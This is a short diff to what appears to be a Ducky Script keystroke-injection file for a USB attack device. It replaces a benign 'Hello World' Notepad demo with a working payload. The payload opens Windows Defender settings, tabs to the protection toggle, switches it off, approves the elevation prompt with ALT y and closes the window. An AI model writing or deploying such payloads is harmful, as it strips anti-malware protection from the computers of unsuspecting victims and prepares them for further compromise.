@@ -1,6 +1,18 @@
-REM The next four lines open Notepad in Windows and type "Hello World!"
-GUI r
-STRING notepad
+REM Disables Windows Defender
+REM Open Defender settings
+DEFAULT_DELAY 300
+CTRL ESC
+STRING defender
 ENTER
-DELAY 250
-STRING Hello World!
+ENTER
+TAB
+TAB
+TAB
+TAB
+ENTER
+REM Disable protection
+SPACE
+ALT y
+REM Clean up
+ALT F4
+  
